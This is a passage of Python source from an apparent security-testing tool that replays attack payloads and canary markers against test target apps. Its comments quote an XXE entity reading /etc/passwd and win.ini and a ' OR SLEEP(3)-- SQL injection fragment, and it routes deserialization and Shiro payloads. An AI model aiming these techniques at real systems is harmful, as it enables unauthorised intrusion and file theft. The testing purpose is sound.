        # 不会逐 spec 重复登录。缓存仅在本实例内避免日志刷屏。
        if not cookies and not headers:
            _fb_target = dict(target)
            if not (_fb_target.get("service_url") or _fb_target.get("base_url")):
                _fb_target["service_url"] = str(_fb_target.get("target_url") or "")
            _fb = _fallback_auth_cookies(_fb_target)
            if _fb:
                cookies.update(_fb)
                _auth_logged = getattr(self, "_fallback_auth_logged", None) or set()
                _lk = str(_fb_target.get("service_url") or "")
                if _lk not in _auth_logged:
                    _auth_logged.add(_lk)
                    self._fallback_auth_logged = _auth_logged
                    logger.info("[D1.auth] 会话自愈：上游未提供凭据，已兜底登录补齐 %d 个 cookie（base=%s）",
                                len(_fb), _lk)
        query: Dict[str, str] = {}
        body: Any = None
        multipart_fields: Dict[str, str] = {}
        path = endpoint

        def _inject(pname: str, ploc: str, pval: str, force_name: bool = False) -> None:
            nonlocal body, path
            ploc = str(ploc or "query").lower()
            # 声明。当它声明 multipart/form-data、而 param_location 被登记成 query/body/form 时，
            # 参数会被塞进 query string —— 目标侧 Spring 的 @RequestParam MultipartFile 永远取不到值
            # （POST /file/upload/picture，ct=multipart/form-data，param=file，loc=query）0 事件即此因。
            # 判定抽到模块级 _should_use_multipart（纯函数，可单测），此处只消费结论并留审计日志。
            if _should_use_multipart(content_type, endpoint, pname, ploc, method):
                logger.info(
                    "[D1.replay] multipart 一致性守卫：%s %s 参数 %r 的 loc=%s 与 multipart 线格式矛盾，改投 multipart（ct=%r）。",
                    method, endpoint, pname, ploc, content_type,
                )
                ploc = "multipart"
            if not pname:
                return
            # 纵深防御：若参数名非法（含逗号/空格/Java 类型签名等），不注入，避免把 canary
            # 发到应用根本不读取的位置（I1 永远读不到）。这正是「D1 没发出能被 I1 读取的
            # 攻击流量」的根因之一，源头应在 A2 登记阶段修（param_resolver 兜底）。
            # force_name=True 是**名注入**专用旁路：这类 servlet 读的就是参数/头的**名字**
            # （00587/01426 等），「非标准名」恰是我们要投放的形态；且 marker 内嵌 payload
            # 字符（xss 的 "><svg、sqli 的引号）时 is_valid_param_name 恒为 False，不放行
            # 会把名注入整条挡死。query 名由 HTTP 层百分号编码，实测可被 servlet 原样读回。
            if not force_name and not is_valid_param_name(pname):
                logger.warning(
                    "[D1.replay] 跳过非法 param_name='%s' 的 canary 注入（loc=%s），不向应用不读取的字段发流量。",
                    pname, ploc,
                )
                return
            if ploc == "query":
                query[pname] = pval
            elif ploc == "header":
                headers[pname] = pval
            elif ploc == "cookie":
                cookies[pname] = _cookie_safe_value(pval)
            elif ploc in ("body", "form"):
                # form：请求体表单编码（@RequestParam / x-www-form-urlencoded）。
                # 线格式由 content_type 决定（见下方 data=/json= 分支），此处统一放入
                # body 字典；content_type 含 "form" 时以 data= 表单发送。
                # raw-body sink（WebUtils.getRequestBody / @RequestBody String）例外：
                # 占位参数名不是真实字段，必须整串原样投递（见 needs_raw_body_payload）。
                if needs_raw_body_payload(spec.get("family"), pname, ploc, content_type):
                    body = pval
                else:
                    if not isinstance(body, dict):
                        body = {}
                    body[pname] = pval
            elif ploc == "multipart":
                # 决策2：认证态 multipart 回放。canary 作为文件字段内容投递；
                # 受保护端点额外需要的 CSRF 由下方发送前补入（见 multipart 发送分支）。
                multipart_fields[pname] = pval
            elif ploc == "path":
                path = path.replace("{" + pname + "}", pval).replace(":" + pname, pval)
            # 返回注入后的请求体：body 为 None 时 _inject 会新建 dict 并 rebind 闭包变量，
            # 调用方（oracle 探测臂）拿不到新引用就会把「已注入」的请求发成空体。
            return body

        # 反序列化 sink：应用先做 Base64.decode(data) 再 readObject。若注入字面 canary，
        # decode 会因「非 4 的倍数 / 非法字符」抛异常，readObject 根本不被调用 → I1 永远 0。
        # 故 family=deserialization（或 exploit_spec 标注 base64 编码）时先 base64 编码 canary
        # 再注入：decode 成功 → readObject 被调用 → 探针挂钩触发（退化 onSink(payload=[])），
        # 由探针回带已注册身份段判定 arrival>0。
        # === 通道B：参数位投放 A2 构造的真实攻击 payload ===
        # payload 由 A2 产出（反序列化需真 gadget 链），D1 只负责投放，绝不在此生成 payload。
        # 注意：A2 的 payload 原样投放，不二次编码 —— 反序列化 gadget 链若被再 base64 一次就废了；
        # 编码由 A2 在构造时自行处理（exploit_spec.payload.encoding）。
        encoded_marker = self._encode_for_family(spec, taint_marker)
        from src.iast.attack_context import (
            sca_forge_attack_payloads, spec_attack_payloads,
            first_sleep_payload, parse_sleep_seconds, neutralize_sleep_payload,
            downgrade_destructive_payload, normalize_attack_payload,
            # 改由 _sanitizer_aware_synth 在净化器约束内构造。此处不再导入。
            filter_payloads_by_family,
        )
        _spec_family = str(spec.get("family") or "")
        attack_payloads = spec_attack_payloads(spec)
        # A2 会跨族串模板（SSRF 位投 shell 命令、CRLF 位投命令注入、反序列化位投类名串），
        # 这些废弹投出去必然打不通，而报告会显示成「探针/靶场问题」，排查方向被带偏。
        # 这里只丢弃不合规载荷并留原因，绝不改动 family / 路由 / spec 本身。
        payload_rejections: List[str] = []
        payload_source = "a2" if attack_payloads else "none"
        if attack_payloads:
            attack_payloads, _rejected = filter_payloads_by_family(attack_payloads, _spec_family)
            if _rejected:
                payload_rejections.extend(_rejected)
                logger.warning(
                    "[D1.replay] %s %s 的 %d 条载荷未过族-载荷一致性自检（family=%s）：%s",
                    spec.get("http_method", "GET"), spec.get("target_endpoint", ""),
                    len(_rejected), _spec_family, sorted(set(_rejected)),
                )
            # 族载荷库的弹会被整体挡住 ⇒ 该族少了「真正能打通」的那一发。
            #
            #   `...<!ENTITY % xxe SYSTEM "file:///etc/passwd">...`
            # —— 形态完全合法（XXE 族自检放行），但**靶场跑在 Windows**，
            # `/etc/passwd` 根本不存在 ⇒ 外部实体解析失败 ⇒ 应用返回 `xxe except`。
            # 而族载荷库的 XXE 弹**同时含 Windows 目标**（`file:///c:/windows/win.ini`）
            # —— 那一发能打通，但因 A2 载荷非空而**从未被投出**。
            #
            # 修法：A2 载荷与族载荷库载荷**合并**（不是二选一）。合并后两种目标都覆盖，
            # 且各自仍是「形状正确」的弹（合并前已各自过族自检）。
            # 上限保护：族载荷库弹追加在**后面**，不挤掉 A2 的弹。
            if attack_payloads:
                try:
                    from src.iast.payload_library import build_family_payloads as _build_lib2
                    _lib2 = _build_lib2(_spec_family, spec)
                    _extra = [p for p in (_lib2.get("payloads") or []) if p and p not in attack_payloads]
                    if _extra:
                        _before = len(attack_payloads)
                        attack_payloads = attack_payloads + _extra
                        logger.info(
                            "[D1.replay] %s %s 合并族载荷库补充载荷 %d 发（family=%s，provider=%s）"
                            "（A2 载荷形态对但目标集不全时，库弹补齐剩余目标）",
                            spec.get("http_method", "GET"), spec.get("target_endpoint", ""),
                            len(_extra), _spec_family, _lib2.get("provider"))
                        payload_source = "%s+library:%s" % (payload_source, _lib2.get("provider") or "?")
                except Exception as _me:
                    logger.debug("[D1.replay] 族载荷库合并失败（忽略）：%s", _me)
        if not attack_payloads:
            # A2 没造出真弹、或造出的弹全被自检判废（反序列化族常见：只有 ysoserial 文本标签 /
            # base64(serialized_object) 占位串 / 纯类名串）
            # → SCA 驱动补位（方案 C 弹药库 + 方案 D ysoserial），对命中 sink 模式的自定义链则走
            # gadget 构造器造真字节（方案 1a）。补位/构造触发自检门抛错（废弹）时按 per-spec 捕获，
            # 标记 degraded —— 绝不把未经验证的 payload 当真弹投出。
            try:
                # → LLM 兜底造弹恒不生效）。是否真的用 LLM 由 PayloadForge 侧在线判定。
                attack_payloads = sca_forge_attack_payloads(spec, db=self.db, gateway=self.gateway)
            except Exception as exc:
                logger.error(
                    "[D1.replay] %s %s 的 sca_forge/gadget 构造抛错（按降级处理，不投废弹）：%s",
                    spec.get("http_method", "GET"), spec.get("target_endpoint", ""), exc,
                )
                attack_payloads = []
            if attack_payloads:
                payload_source = "sca_forge"
        if not attack_payloads:
            # 它不知道对手在拦什么，只能发一发"看起来像"的载荷，历史上正是它让 canary 单独
            # 到达却被算成确认（假阴性）。改为净化感知合成：有 FilterSpec 就在约束内构造并用
            # simulate_filter 确定性验一遍；没有约束就**明确标记 degraded_no_synthesis**，
            # 绝不退回假载荷。
            _syn = _sanitizer_aware_synth(spec, _spec_family)
            if _syn.get("candidates"):
                attack_payloads = list(_syn["candidates"])
                payload_source = "sanitizer_aware"
                logger.info(
                    "[D1.replay] %s %s 净化感知造弹 %d 发（family=%s, kind=%s, 闸门判死 %d 发）",
                    spec.get("http_method", "GET"), spec.get("target_endpoint", ""),
                    len(attack_payloads), _spec_family,
                    (_syn.get("spec") or {}).get("kind") or "unknown", len(_syn.get("rejected") or []),
                )
            elif _syn.get("terminal") or _syn.get("source") == "filter_effective":
                # 真净化器：判定不可绕过 → 不投弹，且这是"确认为不可利用"的真阴性，不是失败
                payload_source = "filter_effective"
                _vr = (spec.get("filter_verdict") or {}).get("reason", "")
                logger.info(
                    "[D1.replay] %s %s 判定不可绕过（真净化器）→ 不投弹、不再重试：%s",
                    spec.get("http_method", "GET"), spec.get("target_endpoint", ""), _vr,
                )
            else:
                # 这一步补的是「A2 造不出 ⇒ 全族 0 确认」的窟窿（本轮 deserialization
                # 12 条 spec 一次重放都没有）。载荷库只产**真能打通**的结构化载荷
                # （完整 XML+外部实体 / 解析歧义型 URL 绕过 / 文本型反序列化链），
                # 产不出就显式 unsupported，**绝不退回「看起来像」的假弹**。
                _lib = {"provider": "none", "payloads": [], "note": ""}
                try:
                    from src.iast.payload_library import build_family_payloads as _build_lib
                    _lib = _build_lib(_spec_family, spec)
                except Exception as _le:  # fail-open：载荷库异常不影响既有降级路径
                    logger.warning("[D1.replay] 族载荷库调用失败（忽略）：%s", _le)
                if _lib.get("payloads"):
                    attack_payloads = list(_lib["payloads"])
                    payload_source = "library:%s" % (_lib.get("provider") or "unknown")
                    logger.info(
                        "[D1.replay] %s %s 族载荷库造弹 %d 发（family=%s, provider=%s）",
                        spec.get("http_method", "GET"), spec.get("target_endpoint", ""),
                        len(attack_payloads), _spec_family, _lib.get("provider"),
                    )
                else:
                    payload_source = "degraded_no_synthesis"
                    logger.warning(
                        "[D1.replay][no-send:no_payload] %s %s 无可用载荷且无净化器约束 → 标记 degraded_no_synthesis"
                        "（不投假弹；family=%s；载荷库=%s）",
                        spec.get("http_method", "GET"), spec.get("target_endpoint", ""),
                        _spec_family, _lib.get("note") or _lib.get("provider"),
                    )
        # D1 主判定只认 attack_payloads[0]：下方第 2、3 发补投明确标注
        # 「只做观测记录，不改变主判定」。所以「把库弹追加在后面」对需要
        # 专用形态的 sink 等于没做。
        #
        #   A2 空 → sca_forge 产出原始 ysoserial 流 rO0ABX...（encoding=sca_forge）
        #   → attack_payloads 非空 ⇒ 后面「净化感知合成 + 族载荷库」整段被跳过
        #   → 应用返回「RememberMe cookie decrypt error」⇒ 607/617/619/622/623 五轮恒漏。
        # 载荷库其实能按源码判定产出 AES-CBC+IV 包装形态（离线复现 2 发已验证）。
        #
        # 修法：载荷库返回的 sink_specific 是**源码级结构契约**（不是靶场名硬编码），
        # 为真时把库弹整体前置，原有弹去重后留在后面作对照形态。
        # 不覆盖真阴性（filter_effective）与已判无弹（degraded_no_synthesis）。
        # 实现收在载荷层 frontload_sink_specific（库弹前置 / 现场 AES 包装兜底 /
        # 空手时库弹补位三条），D1 只消费结构化契约，不碰载荷形态细节。
        if (payload_source != "filter_effective"
                and not str(payload_source or "").startswith(("library:", "sink_specific:"))):
            try:
                from src.iast.payload_library import frontload_sink_specific as _frontload
                _fl = _frontload(_spec_family, spec, attack_payloads)
                if _fl.get("changed") and _fl.get("payloads"):
                    attack_payloads = list(_fl["payloads"])
                    payload_source = "sink_specific:%s" % (_fl.get("provider") or "?")
                    logger.info(
                        "[D1.replay] %s %s sink 专用形态前置 %d 发（family=%s，provider=%s，note=%s；"
                        "主判定只认首发，追加在后面无效）",
                        spec.get("http_method", "GET"), spec.get("target_endpoint", ""),
                        len(attack_payloads), _spec_family, _fl.get("provider"),
                        _fl.get("note"))
            except Exception as _se:  # fail-open：校正失败不影响既有载荷链
                logger.debug("[D1.replay] sink 专用形态前置失败（忽略）：%s", _se)
        attack_degraded = not attack_payloads
        # A2 LLM、SCA 弹药库还是靶场 README，DROP/TRUNCATE/无 WHERE 的 DELETE·UPDATE 等破坏性
        # SQL 一律降级为语法错误型探针（未闭合引号），仍证明注入可达，但绝不破坏靶标 DB
        # （真实环境不自愈，只能人工回滚；靶场被毁会污染其后所有轮次的业务确认）。
        # 见 src/iast/attack_context.downgrade_destructive_payload（单一真相源）。
        # 目标收到 `tpl=tpl=[[${...}]]` → 模板按字面渲染 → 永不触发），再做破坏性降级。
        # 顺序不能反：前缀不剥掉时，破坏性 SQL/命令匹配也会被前缀干扰。
        attack_payloads = [
            normalize_attack_payload(p, param_name) for p in attack_payloads
        ]
        attack_payloads = [
            downgrade_destructive_payload(p, str(spec.get("family") or ""))
            for p in attack_payloads
        ]
        #  方向B 类型感知：退化（无真 payload）时注入的是 canary 探针。若目标参数非 String
        # （Long/数值），字面 canary 字符串会被类型绑定拒绝 → 改用 typed canary（合法数值形态 + 指纹）。
        # 破坏性 payload（真攻击）照原值投放，不受此影响。
        injected_marker = self._canary_for_param(spec, param_name, encoded_marker, base_url)
        # 时间盲注是「威力大不破坏」的最可确认攻击——即便探针没织到该 DB sink、canary 到不了，
        # D2 仍能用「时延双阈值门」独立旁证 sink 触达。这是对主载荷选择的
        # 「增强」（在既有真弹里挑最可确认的一条），不删除任何降级/门禁判定；非 sleep 型时
        # 维持原 attack_payloads[0] 选择，行为不变。
        sleep_payload = first_sleep_payload(attack_payloads) if attack_payloads else None
        if sleep_payload:
            primary_value = str(sleep_payload)
        else:
            primary_value = str(attack_payloads[0]) if attack_payloads else injected_marker
        # sleep_seconds_hint 必须解析自「实际投放的主载荷」（同源）：>0 才让 D2 启用时延确认门，
        # 且门里的 delta 阈值与这条 payload 的预期时延对齐。
        # M6 的 sleep 弹药合成（现造）必须排在 JSON 对象归一化之后，原因见下方 _sleep_synthesized
        # 处的注释 —— 归一化前合成会把整串 JSON 对象塞进 URL。
        sleep_seconds_hint = parse_sleep_seconds(primary_value)

        # A2 有时把「整组请求参数」写成一个 JSON 对象字符串（{"id":1,"amount":0.01}、
        # {"role":"admin","isVip":true}）。整串塞进单个参数位是错的，且是双向错：
        #   1) path 场景：URL 变成 /order/{"id": 1, "amount": 0.01}，{id} 占位符随之消失，
        #      后续 rep 的 canary 再也替换不上 → 必然 404（#30 支付金额篡改的真实故障）；
        #   2) query/body 场景：amount / code / role / address 等关键参数根本没被发出去，
        #      金额篡改、批量赋值、状态机一类业务判据永远不成立 → 全判 no-iast-evidence。
        # 归一化：主参数取对象里同名键的值（取不到就退回 canary，绝不投整串），
        # 其余「rep_params 未覆盖的键」按推断位置补发。canary 语义不变，既有确认不受影响。
        def _lit(v) -> str:
            """JSON 值 → HTTP 参数字面量：布尔走 JSON 语义（true/false），而非 Python 的 True/False。"""
            if v is None:
                return ""
            if isinstance(v, bool):
                return "true" if v else "false"
            if isinstance(v, (dict, list)):
                return json.dumps(v, ensure_ascii=False)
            return str(v)

        # （Fastjson 端点吃 {"name":"..."}），不能当成「A2 把整组请求参数写成一个对象」
        # 去展开归一化 —— 那会把主参数位退回 canary、把结构化弹拆碎。
        _raw_body_sink = needs_raw_body_payload(
            _spec_family, param_name, spec.get("param_location"), content_type)
        _obj_payload: Optional[dict] = None
        _pv0 = str(primary_value or "").strip()
        if (_pv0.startswith("{") and _pv0.endswith("}") and not attack_degraded
                and not _raw_body_sink):
            try:
                _cand = json.loads(_pv0)
            except Exception:
                _cand = None
            if isinstance(_cand, dict) and _cand:
                _obj_payload = _cand

        if _obj_payload is not None:
            _pkey = str(param_name or "")
            if _pkey in _obj_payload:
                primary_value = _lit(_obj_payload.get(_pkey))
            else:
                # payload 对象里没有主参数 → 投整串毫无意义，退回 canary 探针
                primary_value = injected_marker
            sleep_seconds_hint = parse_sleep_seconds(primary_value)

        # rep_params 集合提前算出：合成弹不能覆盖 multi-match 已带标的参数
        # （下面 rep 循环会用 canary 覆盖同名键，先合成等于白投一条没有 canary 的弹）。
        _rep_names = {
            str((_rp or {}).get("param_name") or (_rp or {}).get("name") or "")
            for _rp in (spec.get("representative_request_params") or [])
        }
        # ── M6：A2 没产出 sleep 弹时按环境事实现造一条 ────────────────────────
        # 时间盲注是探针织不到 DB sink 时唯一能独立旁证 sink 触达的通道，但它的前提是
        # 「手里有 sleep 弹」——实测大量 SQLi spec 只有报错型/布尔型弹，通道空转。
        # 先判后投：用环境事实 db_type 收窄方言，只投一组，内嵌库（H2/HSQLDB/Derby/SQLite）
        # 无便携 sleep 直接不投，不浪费 5 次预算。
        #
        # 归一化之前合成时，base 是 attack_payloads[0] 原样 —— A2 常把整组请求参数写成
        # 一个 JSON 对象串（{"id":1,"amount":0.01}），拼出来的 URL 直接变成
        # /order/{"id": 1, "amount": 0.01} OR SLEEP(3)-- ，{id} 路径占位符被吞、后续 rep
        # canary 替换不上必然 404，且 JSON 对象展开逻辑再也收不到这个对象。
        # 归一化之后再合成，base 一定是「真正会投放出去的那个单值」。
        _sleep_synthesized = False
        # 原条件没有族白名单 ⇒ 反序列化位也会被追加 `' OR SLEEP(3)--`，
        # 把 fastjson 的 JSON 串、snakeyaml 的 YAML 串**结构打坏**：
        # 目标解析失败 → 请求挂住 → D1 整组超时。
        # 时间盲注的前提是「目标会执行 SQL」，族不对时它连语法都不成立。
        _SLEEP_FAMILIES = {"sql_injection", "sql-injection", "nosql_injection", "nosql-injection",
                           "ldap_injection", "ldap-injection"}
        _fam_for_sleep = str(_spec_family or "").strip().lower().replace("_", "-")
        if (not sleep_payload and attack_payloads and _spec_family
                and _fam_for_sleep in {f.replace("_", "-") for f in _SLEEP_FAMILIES}
                and not attack_degraded
                # 载荷库产出的结构化载荷（JSON/YAML/XML）绝不能被拼接改写
                and not str(payload_source or "").startswith("library:")
                and str(param_name or "") not in _rep_names):
            try:
                from src.core import sql_dialect as _sqld
                from src.core import runtime_facts as _rtf

                _facts = _rtf.facts_for_workspace(getattr(self, "db", None), spec.get("workspace_id"))
                _db_type = str((_facts or {}).get("db_type") or "")
                if _sqld.supports_sleep(_db_type):
                    _synth = _sqld.build_sleep_payload(
                        _db_type, str(primary_value or ""), _sqld.SLEEP_SECONDS_DEFAULT, _spec_family)
                    if _synth:
                        primary_value = _synth
                        _sleep_synthesized = True
                        # 留痕：合成弹不能冒充 A2 产物，否则对账分不清「A2 想到了」
                        # 和「D1 现造的」，A2 能力评估会被抬高。
                        payload_source = (payload_source + "+sleep_synthesized"
                                          if payload_source else "sleep_synthesized")
                        logger.info(
                            "[D1.replay] %s %s 无 sleep 弹 → 按环境事实现造一条（%s）",
                            spec.get("http_method", "GET"), spec.get("target_endpoint", ""),
                            _sqld.dialect_reason(_db_type, _spec_family),
                        )
            except Exception as _sqle:
                logger.debug("[D1.replay] sleep 弹药合成失败（按原载荷投放）：%s", _sqle)
        # 合成改写了主载荷 → hint 必须重算，否则 D2 时延门拿到的还是旧值的秒数
        sleep_seconds_hint = parse_sleep_seconds(primary_value)

        # 仅 1 条可比对命中），值级通道 _ch_value_level_sink_arg 被结构性饿死，
        # B6 语义门对 7 个 sink 族全拒 → 动态召回 24.8%。
        # 修复：把 canary 标记追加进主参数值，让「我方数据真的出现在 sink 实参里」成为
        # 可比对的事实：TP → hit_live 放行；值被消毒 → hit_sanitized 合法阴性；
        # FP（值不到达 sink）→ miss 证据缺失不确认。
        # 例外：退化模式主值已是 canary；sleep 主载荷不追加（保住时延盲注 SQL 语法）；
        # JSON 对象展开值可能是数值/布尔语义，追加会破坏类型绑定，保持原行为。
        #
        # **完整 taint_marker**（形如 `s4st41<16hex>PAYLOAD<8hex>`，spec 级确定性生成、
        # 跨任务复用），而事件里的 canary 是**请求级**每次新生成的另一个串（实测 143 条
        # 事件里 0 条与 spec marker 相等）。上一版只追加 find_identity 提取的身份段
        # （`s4st41`+16hex），缺了 `PAYLOAD`+后缀，完整 marker 依然匹配不上 ⇒ 值级命中
        # 只从 14 涨到 26，远低于预期。改为追加完整 marker，幂等守卫同步用 marker 全文判断。
        _canary_marker = str(taint_marker or "").strip()
        _canary_ident = ""
        try:
            from src.iast.canary import CanaryMatcher as _cm_ident
            _canary_ident = _cm_ident.find_identity(_canary_marker) or ""
        except Exception:
            _canary_ident = ""
        # 完整 marker 优先（与比对串一致）；取不到则退回身份段（至少不比上一版更差）。
        _canary_tag = _canary_marker or _canary_ident
        # 族名在 spec 上可能挂在 family / category / capability_family 任一键下 —— 实测
        # test_d1_replay 与 test_sca_forge 的 spec 只有 category=deserialization 而没有 family，
        # 只看 family 会让反序列化守卫整个漏掉、把 base64 gadget 字节串改坏。三键全看。
        _fam_text = " ".join(
            str(spec.get(_k) or "") for _k in ("family", "category", "capability_family")
        ).lower()
        # 数值/URL 语义参数不追加：数值位追加 alnum 会让 Spring 类型绑定失败（400/no-arrival，
        # 比不追加更差）；URL 位追加会把 `http://host:8080` 变成 `http://host:8080s4st41…`
        # 导致 new URL 解析抛错、SSRF 通道被打死。这两类参数另有 typed canary 形态兜底。
        if (_canary_tag and not attack_degraded and not sleep_payload
                and _obj_payload is None
                # （`111 * 7` / XML / JSON），末端追加身份段会让它直接编译/解析失败。
                # 627 的 /vuln1 出站 `7*7s4st41…` 恒 500 即此因；IAST 关联靠
                # TRACE_HEADER 里的 canary，不需要把它拼进载荷文本。
                and not _raw_body_sink
                and not self._is_numeric_param(param_name, spec)
                and not self._is_url_param(param_name, spec)
                # 反序列化族：payload 是 base64 gadget 字节串，末尾追加会破坏编码，
                # readObject 直接失败 → sink 根本不触发（比不追加更差）。
                and "deserialization" not in _fam_text
                and _canary_tag not in str(primary_value or "")):
            primary_value = str(primary_value) + _canary_tag
            logger.info(
                "[D1.replay] %s %s 主载荷追加 canary 标记（值级证据通道，完整 taint_marker）",
                spec.get("http_method", "GET"), spec.get("target_endpoint", ""),
            )

        # 等）如果同时收到「固定名头（主值注入）」或 X-SASTAI-Trace，二者也都是非标准头，会把
        # 而非 canary。故名注入源必须**跳过主值注入与 trace 头**，只发名注入。
        _name_source = None
        try:
            from src.core.source_location import detect_name_source
            _src_file = str(spec.get("expected_sink_file") or "")
            if _src_file and os.path.isfile(_src_file):
                _name_source = detect_name_source(path=_src_file)
        except Exception:
            _name_source = None
        # raw-body sink 的 payload 是整段语法，名注入源判定对它没有意义：
        # 这类控制器读的是 request body，不遍历参数名。强制走主值注入，
        # 且不做「源码驱动额外注入点补投」（那会把整段表达式塞进 query/header）。
        if _raw_body_sink:
            _name_source = None
        if not _name_source:
            _inject(param_name, spec.get("param_location", "query"), primary_value)
            if _raw_body_sink:
                logger.info("[D1.replay] raw-body sink %s：整段载荷原样投递，跳过名注入/额外注入点",
                            spec.get("target_endpoint", ""))
            # 阶段 1.1（源码驱动注入点补投）：spec 的 param_name/location 与 servlet 源码
            # 真实取源不一致时（A2 默认猜 query，实际读 header/cookie；或源藏在 helper 类），
            # 其中 9 个「弱证据 TP」全属此类。这里按源码推导结果补投 spec 未覆盖的位置。
            # 只补不替：spec 已声明的 (name, location) 不重复注入，主路径行为不变。
            try:
                from src.iast.source_infer import derive_extra_injections as _derive_extra
                _extra = [] if _raw_body_sink else _derive_extra(spec)
                for _ep_name, _ep_loc in _extra:
                    _inject(_ep_name, _ep_loc, primary_value)
                if _extra:
                    logger.info(
                        "[D1.replay] 源码驱动补投 %d 个注入点（spec 声明 name=%r loc=%r）：%s",
                        len(_extra), param_name, spec.get("param_location"), _extra,
                    )
            except Exception as _sei:
                logger.debug("[D1.replay] 源码驱动补投跳过：%s", _sei)
        else:
            logger.info(
                "[D1.replay] %s %s 名注入源（%s）→ 跳过主值注入，仅投名注入",
                spec.get("http_method", "GET"), spec.get("target_endpoint", ""), _name_source,
            )

        #   - 00587/00588/01455 等：取「值 == servlet 名」的那个参数的**名字**作 param；
        #   - 00251 等：取首个非标准头的**名字**作 param。
        # 此前 D1 只把 canary 当「值」投，这些 servlet 永远到不了真 sink。
        # canary 唯一，故额外以「名」形式在各位置注入一次即可覆盖；对读「值」的 servlet 无害
        # （它们按固定名取参，多出的参数被忽略）。`<marker>Z` 兜底 `substring(0,len-1)` 截断型。
        #
        # marker 内嵌 XSS 载荷（形如 `s4st41<16hex>"><svg<8hex>`），该函数恒为 False ⇒
        # 名注入整条被挡死，xss 01426/01427/01428 三个真漏洞用例原生一个都没确认
        # 要投放的形态，且 servlet 会把名字原样反射回响应，值级命中（compute_value_hit
        # 比对完整 marker）才成立——实测「名=完整 marker」回显完整 marker 且
        # sink-reached-probe in_val=True；「名=身份段」则完整 marker 不回显、值级必然 miss。
        # 故 query 名走 force_name 旁路；
        # cookie/header 名受 RFC6265/RFC7230 字符集约束，仍守 is_valid_param_name。
        _servlet_name = endpoint.rsplit("/", 1)[-1] if endpoint else param_name
        if _servlet_name and taint_marker:
            for _nl in ("query", "cookie", "header"):
                _force = (_nl == "query")
                _inject(taint_marker, _nl, _servlet_name, force_name=_force)
                _inject(taint_marker + "Z", _nl, _servlet_name, force_name=_force)

        # 对象里其余键补发（rep_params 已覆盖的不动，避免冲掉 canary）
        _appended_from_payload: Dict[str, str] = {}
        if _obj_payload is not None:
            _infer_loc = (
                "query" if method in ("GET", "HEAD", "DELETE")
                else ("form" if "form" in content_type.lower() else "body")
            )
            for _k, _v in _obj_payload.items():
                _k = str(_k or "")
                if not _k or _k in _rep_names or not is_valid_param_name(_k):
                    continue
                _vv = _lit(_v)
                _inject(_k, _infer_loc, _vv)
                _appended_from_payload[_k] = _vv
            if _appended_from_payload:
                logger.info(
                    "[D1.replay] JSON 对象型 payload 已展开补发缺失参数：%s %s → %s",
                    method, endpoint, sorted(_appended_from_payload),
                )

        # multi-match：representative_request_params 全参数带标、一次回放（4.7.2）
        rep = spec.get("representative_request_params") or []
        # slices 严格保持「per-param 切片」语义：攻击元数据不混进来，
        # 否则会污染按参数名遍历 slices 的消费方。元数据改挂 DastImpact 的显式字段。
        slices: Dict[str, Any] = {}
        _main_name = str(param_name or "")
        _main_loc = str(spec.get("param_location") or "query").lower()
        for rp in rep:
            rp = dict(rp or {})
            #   内存态（entry_discovery_service._extract_request_params）：param_name/param_location
            #   DB 态：name/location/value
            # D1 此前只读 param_name ⇒ 对 DB 态 spec，rname 恒为 "" ⇒ _inject 走到
            # `if not pname: return` 直接空转 ⇒ 「全参数带标一次回放」（4.7.2）从落地起
            # 从未真正带过任何一个参数。同文件 1549 行的 _rep_names 早已用
            # `get("param_name") or get("name")` 兼容，此处漏了 —— 补齐。
            rname = rp.get("param_name") or rp.get("name") or ""
            rloc = rp.get("param_location") or rp.get("location") or "query"
            rval = self._encode_for_family(spec, rp.get("taint_marker") or taint_marker)
            rval = self._canary_for_param(spec, rname, rval, base_url)
            # 2323 行的主注入已经把 `primary_value`（真弹）放进同一个 (name, location) 槽位。
            # rep 循环在这里又用 taint_marker 调一次 _inject，同键覆盖 ⇒ **实际出站值变成
            # canary**，而 `replay_attempts.payload` 记的仍是 primary_value。证据链与出站报文
            # 就此分叉：Shiro 端点收到 `s4st...PAYLOAD...`，Base64 解码后既不是 16 倍数、
            # 也不是 AES 密文，acs.decrypt 抛 doFinal 异常 ⇒ 恒定返回
            # "RememberMe cookie decrypt error"。离线手工重打库里的完整 AES 包装弹
            # （2816 字符 / 2112 字节 / %16=0）则返回 "Shiro deserialize"，正反对照坐实。
            # 这个覆盖对所有族都存在，只是 base64 gadget / AES 密文这类「值本身即结构」的
            # 载荷最致命；文本族即便被覆盖也还能靠 canary 到达 sink，故一直没暴露。
            # 修法：主参数位保留真弹，只登记观测切片；其余参数位照常全参数带标。
            # 爆炸半径控制：只护住「值本身即结构」的载荷（反序列化 gadget / AES 密文 /
            # 载荷库专用形态）；文本族即便被 canary 覆盖也仍能靠 header 关联到达 sink，
            # 保持既有基线不动，避免一次改动把全部族的投放值换掉。
            _structured = ("deserialization" in _fam_text
                           or str(payload_source or "").startswith(("sink_specific:", "library:")))
            # _should_use_multipart 会把 query/body/form 全部归一到同一个
            # multipart 字段。此时「rloc=query vs 主 loc=form」只是登记漂移，
            # 实际仍是同槽位 —— 不认这一点，rep canary 会把 file_upload 主弹覆盖掉
            # （627 的 /file/upload 出站 payload 恒空即此因）。
            _same_slot = (str(rname) == _main_name
                          and (str(rloc).lower() == _main_loc
                               or "multipart" in str(content_type or "").lower()))
            if _same_slot and not attack_degraded and _structured:
                slices[rname] = {
                    "param_location": str(rloc).lower(),
                    "taint_marker": rval,
                    "attack_payload_used": True,
                }
                logger.info(
                    "[D1.replay] 主参数位 %s(%s) 保留真弹，跳过 rep canary 覆盖"
                    "（实际出站值长度=%d，避免证据链与报文分叉）",
                    rname, _main_loc, len(str(primary_value or "")))
                continue
            _inject(rname, rloc, rval)
            if rname:
                slices[rname] = {"param_location": str(rloc).lower(), "taint_marker": rval}

        # 以 "/" 开头的相对 URL 一律按「绝对路径」处理 ⇒ 直接丢弃 base_url 的 context path。
        # 而带前缀的 /benchmark/xss-00/... 是 200 且原样反射。⇒ 重放 100% 打在 404 上，
        # servlet 根本不执行、sink 不触发，arrivals 自然恒 0（事件表里只剩 Tomcat 404 页的
        # Response.setHeader）。同文件 817/850/2368/2385/2455 早已用 .lstrip("/")，仅 spec
        # 驱动的这几处漏了 —— 补齐，与既有写法和 urljoin 语义对齐。
        url = _join_url(base_url, path)

        #  通道A：canary 走请求头，探针透传回事件 traceId 供 I1 做请求级关联。
        # 这样 I1 关联的是「这次请求的身份」，而不是「payload 的值」——
        # 后续 payload 加绕过、变形、编码、混淆都不会让 I1 丢失监听（这是 canary 融合方案的死穴）。
        from src.iast.attack_context import TRACE_HEADER
